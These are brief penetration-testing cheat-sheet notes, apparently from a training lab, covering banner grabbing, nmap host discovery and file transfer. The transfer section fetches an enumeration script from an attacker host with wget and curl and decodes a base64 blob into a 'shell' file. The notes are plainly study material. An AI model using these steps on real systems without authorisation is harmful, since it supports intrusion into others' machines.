# Banner Graping
```bash
nc -nv <ip> <port>

curl -IL https://www.inlanefreight.com

whatweb --no-errors 10.10.10.0/24

ssl certificate

http://10.10.10.10/robots.txt

javascript source code
```
---
# File transfer
```bash
wget http://10.10.14.1:8000/linenum.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

scp linenum.sh user@remotehost:/tmp/linenum.sh

echo <base64 encoded file> | base64 -d > shell
```
---
# nmap
```bash
sudo nmap -sn -oA tnet -iL ip.list

sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping
```
- `-sn` : Disables port scanning.
- `-PE` : ICMP Echo requests(ping test)
-  `--disable-arp-ping` : 라우터 너머에 있는 호스트는 ARP로 도달 불가능하므로 ICMP/TCP 필요
